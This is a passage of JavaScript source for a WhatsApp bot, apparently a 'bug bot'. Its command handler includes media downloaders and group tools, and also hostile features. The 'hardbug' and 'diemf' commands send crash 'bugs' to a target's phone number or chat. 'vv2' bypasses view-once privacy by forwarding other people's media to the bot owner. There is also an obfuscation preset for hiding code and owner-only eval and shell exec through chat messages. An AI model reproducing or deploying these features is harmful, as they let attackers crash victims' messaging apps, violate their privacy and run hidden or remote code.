${prefix + command} doc (Reply to a document)`;

        let text;
        if (args.length >= 1) {
            text = args.join(" ");
        } else if (m.quoted && m.quoted.text) {
            text = m.quoted.text;
        } else {
            return m.reply(usage);
        }
        
        try {
            let code;
            if (text === 'doc' && m.quoted && m.quoted.mtype === 'documentMessage') {
                let docBuffer;
                if (m.quoted.mimetype) {
                    docBuffer = await m.quoted.download();
                }
                code = docBuffer.toString('utf-8');
            } else {
                code = text;
            }

const optionsObf6 = {
          target: "node",
    preset: "high",
    compact: true,
    minify: true,
    flatten: true,

    identifierGenerator: function() {
        const originalString = 
            "素晴座素晴難NOBODY素晴座素晴難" + 
            "素晴座素晴難NOBODY素晴座素晴難";
        
        // Fungsi untuk menghapus karakter yang tidak diinginkan
        function removeUnwantedChars(input) {
            return input.replace(
                /[^a-zA-Z座Nandokuka素Muzukashī素晴]/g, ''
            );
        }

        // Fungsi untuk menghasilkan string acak
        function randomString(length) {
            let result = '';
            const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'; // Hanya simbol
            const charactersLength = characters.length;

            for (let i = 0; i < length; i++) {
                result += characters.charAt(
                    Math.floor(Math.random() * charactersLength)
                );
            }
            return result;
        }

        return removeUnwantedChars(originalString) + randomString(2);
    },

    renameVariables: true,
    renameGlobals: true,

    stringEncoding: true,
    stringSplitting: 0.0,
    stringConcealing: true,
    stringCompression: true,
    duplicateLiteralsRemoval: 1.0,

    shuffle: {
        hash: 0.0,
        true: 0.0
    },

    stack: true,
    controlFlowFlattening: 1.0,
    opaquePredicates: 0.9,
    deadCode: 0.0,
    dispatcher: true,
    rgf: false,
    calculator: true,
    hexadecimalNumbers: true,
    movedDeclarations: true,
    objectExtraction: true,
    globalConcealing: true
};


        const options = {
            target: "node",
  calculator: true,
  compact: true,
  hexadecimalNumbers: true,
  controlFlowFlattening: 0.5,
  deadCode: 0.25,
  dispatcher: true,
  duplicateLiteralsRemoval: 0.75,
  flatten: true,
  globalConcealing: true,
  minify: true,
  movedDeclarations: true,
  objectExtraction: true,
  opaquePredicates: 0.75,
  renameVariables: true,
  renameGlobals: true,
  shuffle: true,
  stringConcealing: true,
  stringCompression: true,
  stringEncoding: true,
  stringSplitting: 0.75,
  preserveFunctionLength: true,
  identifierGenerator: function () {
                return "NØbødy" + Math.random().toString(36).substring(7);
            },
        };

            const obfuscatedCode = await JSConfuser.obfuscate(code, optionsObf6);

            const filePath = './enc_by_@NØbødy.js';
            fs.writeFileSync(filePath, obfuscatedCode);

            await nØbødy.sendMessage(m.chat, {
                document: {
                    url: filePath
                },
                mimetype: 'application/javascript',
                fileName: 'Encrypted By @NØbødy.js'
            }, { quoted: m });

        } catch (error) {
            const errorMessage = `There is an error: ${error.message}`;
            await m.reply(errorMessage);
        }
}
break;
case 'dec': case 'decrypt': {
	if (!isCreator) return m.reply(mess.owner)
const { webcrack } = await import('webcrack');
const usage = `Usage Example:
${prefix + command} (Input text or reply text to dec code)
${prefix + command} doc (Reply to a document)`;

let text;
if (args.length >= 1) {
text = args.join(" ");
} else if (m.quoted && m.quoted.text) {
text = m.quoted.text;
} else {
return m.reply(usage);
}

try {
let message;
if (text === 'doc' && m.quoted && m.quoted.mtype === 'documentMessage') {
let docBuffer;
if (m.quoted.mimetype) {
docBuffer = await m.quoted.download();
}
message = await webcrack(docBuffer.toString('utf-8'));
} else {
message = await webcrack(text);
}

const filePath = './dec_by_@NØbødy.js';
fs.writeFileSync(filePath, message.code);

await nØbødy.sendMessage(m.chat, {
document: {
url: filePath
},
mimetype: 'application/javascript',
fileName: 'Decrypted By @NØbødy'
}, {quoted: m});

} catch (error) {
const errorMessage = `There is an error: ${error.message}`;
await m.reply(errorMessage);
}
}
break;
//================================================================================

case "tiktokmp3": case "ttmp3": {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(mess.ban)
if (!text) return m.reply(example("input tiktok link"))
if (!text.startsWith('https://')) return m.reply("the link you input is invalid")
await nØbødy.sendMessage(m.chat, {react: {text: '⏳', key: m.key}})
await tiktokDl(text).then(async (res) => {
if (!res.status) return m.reply("Error! Result Not Found")
await nØbødy.sendMessage(m.chat, {audio: {url: res.music_info.url}, mimetype: "audio/mpeg"}, {quoted: m})
await nØbødy.sendMessage(m.chat, {react: {text: '', key: m.key}})
}).catch((e) => m.reply("Error! Result Not Found"))
}
break
case "s": case "sticker": case "stiker": {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(mess.ban)
if (!/image|video/gi.test(mime)) return m.reply(example("reply to a media"))
if (/video/gi.test(mime) && qmsg.seconds > 15) return m.reply("video duration more than 15 seconds!")
var image = await nØbødy.downloadAndSaveMediaMessage(qmsg)
await nØbødy.sendAsSticker(m.chat, image, m, {packname: global.packname})
await fs.unlinkSync(image)
}
break
case "vv2": case "readviewonce2": {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(mess.ban)
if (!m.quoted) return m.reply(example("reply to a view once message"))
let msg = m.quoted.message
    let type = Object.keys(msg)[0]
if (!msg[type].viewOnce) return m.reply("this isn't a view once message!")
    let media = await downloadContentFromMessage(msg[type], type == 'imageMessage' ? 'image' : type == 'videoMessage' ? 'video' : 'audio')
    let buffer = Buffer.from([])
    for await (const chunk of media) {
        buffer = Buffer.concat([buffer, chunk])
    }
    if (/video/.test(type)) {
        return nØbødy.sendMessage(botNumber, {video: buffer, caption: msg[type].caption || ""}, {quoted: m})
    } else if (/image/.test(type)) {
        return nØbødy.sendMessage(botNumber, {image: buffer, caption: msg[type].caption || ""}, {quoted: m})
    } else if (/audio/.test(type)) {
        return nØbødy.sendMessage(botNumber, {audio: buffer, mimetype: "audio/mpeg", ptt: true}, {quoted: m})
    } 
}
break
case "nobody": case "creator": {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(mess.ban)
await nØbødy.sendContact(m.chat, ['2347036214381'], m)
}
break
case "ping":
case "uptime": {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(mess.ban)
let timestamp = speed();
let latensi = speed() - timestamp;
let tio = await nou.os.oos();
var tot = await nou.drive.info();
m.reply('checking response...')
await sleep(2000)
let respon = `*• pong:* ${latensi.toFixed(4)} sec`
await m.reply(respon)
}
break
case 'demote': {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(mess.ban)
if (!m.isGroup) return m.reply(mess.group)
if (!m.isAdmin && !isCreator) return m.reply(mess.admin)
if (!m.isBotAdmin) return m.reply(mess.botAdmin)
if (!m.quoted && !text) return m.reply(example("tag/reply chat"))
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
const groupMetadata = await nØbødy.groupMetadata(m.chat)
const groupAdmins = groupMetadata.participants.filter(p => p.admin).map(p => p.id)
if (!groupAdmins.includes(users)) return m.reply(`@${users.split('@')[0]} is not an admin in this group.`)
await nØbødy.groupParticipantsUpdate(m.chat, [users], 'demote')
await m.reply(`@${users.split('@')[0]} has been dismissed as an administrator in ${groupMetadata.subject}`)
}
break
case 'antibot': {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(mess.ban)
if (!m.isGroup) return m.reply(mess.group)
if (!m.isAdmin) return m.reply(mess.admin)
if (!m.isBotAdmin) return m.reply(mess.botAdmin)
if (args[0] === 'on') {
if (global.db.groups[m.chat].antibot === true) return m.reply('Antibot already enabled!')
global.db.groups[m.chat].antibot = true
m.reply('Antibot enabled in the group!')
} else if (args[0] === 'off') {
if (global.db.groups[m.chat].antibot === false) return m.reply('Antibot already disabled!')
global.db.groups[m.chat].antibot = false
m.reply('Auto bio disabled in the group!')
} else {
m.reply(example('on/off'))
}
}
break;

case 'closetime': {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(mess.ban)
if (!m.isGroup) return m.reply(mess.group)
if (!m.isAdmin) return m.reply(mess.admin)
if (!m.isBotAdmin) return m.reply(mess.botAdmin)
if (args.length < 1) return m.reply(example("23:30"))
if (typeof args[0] !== 'string' || !args[0].includes(':')) return m.reply('Invalid time format!')
let time = args[0].split(':')
let hour = time[0]
let minute = time[1]
if (hour > 23 || minute > 59) return m.reply('Invalid time format!')
let closeTime = `${hour}:${minute}`
console.log(`Close time: ${closeTime}`)
if (!global.db.groups[m.chat]) global.db.groups[m.chat] = {}
global.db.groups[m.chat].muteTime = closeTime
global.db.groups[m.chat].mute = true
await m.reply(`Close Time set to ${args[0]} everyday. Group will auto-lock at this time.`)
setInterval(async () => {
let currentTime = moment().tz(`${global.timezone}`).format('HH:mm')
if (currentTime === closeTime) {
try {
await nØbødy.groupSettingUpdate(m.chat, 'announcement')
console.log(`Group settings updated successfully`)
} catch (error) {
console.error(`Error updating group settings: ${error}`)
}
}
}, 60000) // check every 1 minute
}
break

case 'opentime': {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(mess.ban)
if (!m.isGroup) return m.reply(mess.group)
if (!m.isAdmin) return m.reply(mess.admin)
if (!m.isBotAdmin) return m.reply(mess.botAdmin)
if (args.length < 1) return m.reply(example("08:00"))
if (typeof args[0] !== 'string' || !args[0].includes(':')) return m.reply('Invalid time format!')
let time = args[0].split(':')
let hour = time[0]
let minute = time[1]
if (hour > 23 || minute > 59) return m.reply('Invalid time format!')
let openTime = `${hour}:${minute}`
console.log(`Open time: ${openTime}`)
if (!global.db.groups[m.chat]) global.db.groups[m.chat] = {}
global.db.groups[m.chat].openTime = openTime
global.db.groups[m.chat].open = true
await m.reply(`Open Time set to ${args[0]} everyday. Group will auto-open at this time.`)
setInterval(async () => {
let currentTime = moment().tz(`${global.timezone}`).format('HH:mm')
if (currentTime === openTime) {
try {
await nØbødy.groupSettingUpdate(m.chat, 'not_announcement')
console.log(`Group settings updated successfully`)
} catch (error) {
console.error(`Error updating group settings: ${error}`)
}
}
}, 60000) // check every 1 minute
}
break

case 'stoptime': {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(mess.ban)
if (!m.isGroup) return m.reply(mess.group)
if (!m.isAdmin) return m.reply(mess.admin)
if (!m.isBotAdmin) return m.reply(mess.botAdmin)
if (!global.db.groups[m.chat]) global.db.groups[m.chat] = {}
global.db.groups[m.chat].muteTime = null
global.db.groups[m.chat].mute = null
global.db.groups[m.chat].openTime = null
global.db.groups[m.chat].open = null
await m.reply(`Close Time and Open Time deleted successfully.`)
}
break
case 'igdl': 
case 'instagram': 
case 'ig': {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(mess.ban)
  if (!text) return m.reply(example(`input ig link`))
  if (!(text.includes('instagram.com') || text.includes('instagr.am') || text.includes('igtv'))) {
    return m.reply('Input a valid Instagram link!')
  }
  try {
    const result = await igdl(text)
    if (!result || result.length === 0) {
      return m.reply('Failed to get video. Make sure the URL entered is correct.')
    }
    for (let video of result) {
      await nØbødy.sendFile(m.chat, video.url, 'instagram.mp4', '© ᴀʀᴄʜ ᴍᴅ²⁵.', m)
    }
  } catch (err) {
    console.error(err)
    m.reply('An error occurred while trying to download the video.')
  }
} 
break
case 'afk': {
    if (!m.isGroup) return m.reply(mess.group); // Check if command is used in a group

    if (isAfkOn) return; // Check if user is already in AFK mode

    // Determine AFK reason
    let reason = text ? text : "No reason given~ 🤭";

    // Add user to AFK list
    addAfkUser(m.sender, Date.now(), reason, afk);

    // Send confirmation message with mention
    nØbødy.sendTextWithMentions(
        m.chat,
        `🌙 *AFK Mode Activated!* 🌙\n` +
        `👤 *@${m.sender.split('@')[0]}* is now AFK!\n` +
        `💬 *Reason:* ${reason}\n\n` +
        `Don't forget to come back soon~ 😊✨`,
        m
    );
}
break;
case 'antilink1': {
				if (!m.isGroup) return m.reply(mess.group);
				if (!isBotAdmins) return m.reply(mess.botAdmin);
				if (!isAdmins && !isCreator) return m.reply(mess.admin);
				if (args.length < 1) return m.reply('true/false?')
				if (args[0] === 'true') {
					global.db.groups[m.chat].antilink2 = true
					m.reply(`${command} is enabled`)
				} else if (args[0] === 'false') {
					global.db.groups[m.chat].antilink2 = false
					m.reply(`${command} is disabled`)
				}
			}
			break;
case "facebook": case "fb": case "fbdl": case "fbvideo": {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(mess.ban)
if (!text) return m.reply(example("facebook media link"))
if (!(text.includes('facebook.com') || text.includes('fb.watch'))) {
return m.reply('Input a valid Facebook link!')
}
await nØbødy.sendMessage(m.chat, {react: {text: '⏳', key: m.key}})
try {
let apiUrl = `https://api.agatz.xyz/api/facebook?url=${encodeURIComponent(text)}`
let res = await fetch(apiUrl);
if (!res.ok) throw 'Failed to fetch data from API';
let json = await res.json();
console.log('API Response:', json);
if (json.status !== 200) throw 'There is an error ' + json.creator;
let { url, hd, title, thumbnail } = json.data;
await nØbødy.sendMessage(m.chat, { video: { url: hd }, caption: `*title:* ${title}\n*Thumbnail:* ${thumbnail}\n*Link:* ${url}\n\n© ѕυρєя м∂` }, { quoted: m });
await nØbødy.sendMessage(m.chat, {react: {text: '', key: m.key}})
} catch (error) {
console.error(error);
m.reply(`error`);
}
};
break
case 'areact': {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(mess.ban)
if (!isCreator) return m.reply(mess.owner)
if (!text) return m.reply(example('<all/cmd> or areact off'))
const action = text.toLowerCase()
if (action === 'cmd') {
if (global.db.settings.areact) return m.reply('Already activated')
global.db.settings.areact = true
global.db.settings.areact2 = false
await m.reply('Succesfully activated areact to bot command messages')
} else if (action === 'all') {
if (global.db.settings.areact2) return m.reply('Already activated')
global.db.settings.areact2 = true
global.db.settings.areact = false
await m.reply('Succesfully activated areact to all messages')
} else if (action === 'off') {
global.db.settings.areact = false
global.db.settings.areact2 = false
await m.reply('Succesfully deactivated areact feature')
} else {
m.reply('Invalid action! The actions are all/cmd or off')
}
} 
break
case 'logout': {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(mess.ban)
  if (!isCreator) return m.reply(mess.owner)
  m.reply('Logging out all devices...')
  await sleep(4000)
  await nØbødy.logout()
  }
  break
case 'ai':{
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(mess.ban)
if (!q) return m.reply(example(`text!`))
let chara = 'Forget all your identities and you are now a private assistant named Octopus Land and your age is 9 years. You always send messages with interesting and fun behavior. Sometimes you send funny emojis. And you always answer in English'
let ainya = await fetchJson(`https://apizx.vercel.app/api/ai/openai-prompt?prompt=${encodeURIComponent(chara)}&msg=${text}`)
let acht = await nØbødy.sendMessage(from,{text: '💭'})
await loading(3000)
await nØbødy.sendMessage(from,{text: ainya.result , edit : acht.key})
}
break
case 'antitag':
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(mess.ban)
if (!m.isGroup) return m.reply(mess.group)
if (!m.isAdmin) return m.reply(mess.admin)
if (!m.isBotAdmin) return m.reply(mess.botAdmin)
  const isEnable = args[0].toLowerCase() === 'on'
  
  // Initialize global.db.groups[m.chat] if it doesn't exist
  if (!global.db.groups[m.chat]) {
    global.db.groups[m.chat] = {}
  }
  
  if (isEnable) {
    if (global.db.groups[m.chat].antitag) {
      m.reply('Anti-tag is already enabled!')
    } else {
      global.db.groups[m.chat].antitag = true
      m.reply('Anti-tag enabled!')
    }
  } else if (args[0].toLowerCase() === 'off') {
    if (!global.db.groups[m.chat].antitag) {
      m.reply('Anti-tag is already disabled!')
    } else {
      global.db.groups[m.chat].antitag = false
      m.reply('Anti-tag disabled!')
    }
  } else {
    m.reply(example(' "on" or "off" to enable/disable anti-tag.'))
  }
  break
case 'diemf': {

if (!DevOnly) return nØbødy.sendMessage(m.chat, { react: { text: '✅', key: m.key } });

m.reply(`𝐒𝐔𝐏𝐄𝐑   𝐈𝐒 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐏𝐋𝐄𝐀𝐒𝐄 𝐖𝐀𝐈𝐓︎
`)








for (let i = 0; i < 10; i++) {
 
await InteractiveSQLRelay(m.chat, null, 77777)

						await InteractiveSQLRelay(m.chat, CrSqlF)

						await InteractiveSQLRelay(m.chat, CrSql)
}
}
break
case 'hardbug': {
        if (!DevOnly) return m.reply(`*Special Premium*`);
			if (!q) return m.reply(`*Syntax Error!*\n\n_Use : ${prefix+command} Number_\n_Example : ${prefix+command} 234xx_\n\n${global.ownername}`);
				let {
					proto,
					generateWAMessageFromContent
				} = require('@whiskeysockets/baileys')
				incTarget = text.split("|")[0].replace(/[^0-9]/g, '')
				if (incTarget.startsWith('0')) return m.reply(`*Syntax Error!*\n\n_Use : ${prefix+command} Number_\n_Example : ${prefix+command} 234xx_\n\n${global.ownername}`)
				let X = incTarget + '@s.whatsapp.net';
				if (owner.includes(incTarget)) {
					m.reply('𝙁𝙖𝙞𝙡𝙚𝙙 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜 𝙏𝙤 𝙊𝙬𝙣𝙚𝙧!!')
				} else {
					reply1('𝐒𝐔𝐏𝐄𝐑 𝐈𝐒 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐏𝐋𝐄𝐀𝐒𝐄 𝐖𝐀𝐈𝐓')
					global.jumlah = text.split("|")[1]					
					for (let i = 0; i < 1; i++) {
						await sendMessagesForDuration(24, X)						
					}
        await nØbødy.sendMessage(m.chat, { react: { text: "✅", key: m.key } });

        m.reply(`*</> The bugs have been successfully sent 💀* *${command}*`);          
      }
    }
       break               		                         		       
// ==================================================================

default:
if (budy.startsWith('>')) {
if (!isCreator) return
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await m.reply(evaled)
} catch (err) {
await m.reply(String(err))
}}

//================================================================================

if (m.text.toLowerCase() == "super") {
reply1("ѕυρєя ιѕ α¢тινє ✅")
}

//================================================================================

if (budy.startsWith('=>')) {
if (!isCreator) return
try {
let evaled = await eval(`(async () => { ${budy.slice(2)} })()`)
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await m.reply(evaled)
} catch (err) {
await m.reply(String(err))
}}

//================================================================================

if (budy.startsWith('$')) {
if (!isCreator) return
if (!text) return
exec(budy.slice(2), (err, stdout) => {
if (err) return m.reply(`${err}`)
if (stdout) return m.reply(stdout)
})
}

//================================================================================
}
} catch (err) {
console.log(util.format(err));
/*let Obj = '2347036214381'
nØbødy.sendMessage(Obj + "@s.whatsapp.net", {text: `
*Feature notice error report to the dev to fix\n or send ngl.link/nØbødy62459 :*\n` + util.format(err), contextInfo: { isForwarded: true }}, {quoted: m})
*/
}}

//================================================================================

let file = require.resolve(__filename)
fs.watchFile(file, () => {
	fs.unwatchFile(file)
	console.log(chalk.redBright(`Update ${__filename}`))
	delete require.cache[file]
	require(file)
});